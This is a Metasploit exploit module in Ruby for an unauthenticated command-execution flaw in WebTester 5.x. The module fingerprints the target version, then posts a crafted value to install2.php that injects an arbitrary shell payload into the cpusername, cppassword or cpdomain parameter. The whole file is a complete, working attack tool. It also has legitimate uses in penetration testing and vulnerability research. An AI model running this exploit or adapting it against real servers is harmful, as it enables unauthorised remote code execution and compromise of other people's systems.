# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "WebTester 5.x Command Execution",
      &#039;Description&#039;    => %q{
          This module exploits a command execution vulnerability in WebTester
        version 5.x. The &#039;install2.php&#039; file allows unauthenticated users to
        execute arbitrary commands in the &#039;cpusername&#039;, &#039;cppassword&#039; and
        &#039;cpdomain&#039; parameters.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039;  # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;       => &#039;https://sourceforge.net/p/webtesteronline/bugs/3/&#039;]
        ],
      &#039;Payload&#039;        =>
        {
            &#039;Space&#039;       => 8190, # Just a big value, injection on POST variable
            &#039;DisableNops&#039; => true,
            &#039;BadChars&#039;   => "\x00"
        },
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Targets&#039;        =>
        [
          # Tested on WebTester v5.1.20101016
          [ &#039;WebTester version 5.x&#039;, { &#039;auto&#039; => true } ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Oct 17 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to WebTester&#039;, &#039;/webtester5/&#039;])
        ], self.class)
  end
 
  #
  # Checks if target is running WebTester version 5.x
  #
  def check
    res = send_request_raw({ &#039;uri&#039; => normalize_uri(target_uri.path) })
 
    if not res
      print_error("#{peer} - Connection timed out")
      return Exploit::CheckCode::Unknown
    end
 
    if res.body =~ /Eppler Software/
      if res.body =~ / - v5\.1\.20101016/
        print_status("#{peer} - Found version: 5.1.20101016")
        return Exploit::CheckCode::Vulnerable
      elsif res.body =~ / - v(5\.[\d\.]+)/
        print_status("#{peer} - Found version: #{$1}")
        return Exploit::CheckCode::Appears
      else
        return Exploit::CheckCode::Detected
      end
    else
      return Exploit::CheckCode::Safe
    end
  end
 
  def exploit
    vuln_params = [
      &#039;cpusername&#039;,
      &#039;cppassword&#039;,
      &#039;cpdomain&#039;
    ]
    print_status("#{peer} - Sending payload (#{payload.encoded.length} bytes)...")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;install2.php&#039;),
      &#039;vars_post&#039;  => {
        &#039;createdb&#039; => &#039;yes&#039;,
        &#039;cpanel&#039;   => &#039;yes&#039;,
        "#{vuln_params.sample}" => "&#039;;#{payload.encoded} #"
      }
    })
 
    if not res
      fail_with(Failure::Unknown, "#{peer} - Request timed out")
    elsif res.code == 200 and res.body =~ /Failed to connect to database server/
      print_good("#{peer} - Payload sent successfully")
    else
      fail_with(Failure::Unknown, "#{peer} - Something went wrong")
    end
 
  end
end

